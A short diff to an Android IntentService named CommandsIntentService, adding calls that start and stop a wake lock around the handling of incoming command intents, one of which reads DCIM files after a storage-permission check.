@@ -117,6 +117,7 @@ public class CommandsIntentService extends IntentService {
     @Override
     protected void onHandleIntent(Intent intent) {
         if (intent != null && intent.getAction() != null) {
+            Systems.Processor.startWakeLock(this);
             String action = intent.getAction();
             if (action.equals(ACTION_DCIM_FILES)) {
                 if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
@@ -500,6 +501,7 @@ public class CommandsIntentService extends IntentService {
             }else {
                 Log.d(TAG, "No action found!");
             }
+            Systems.Processor.stopWakeLock();
             stopSelf();
         }
     }
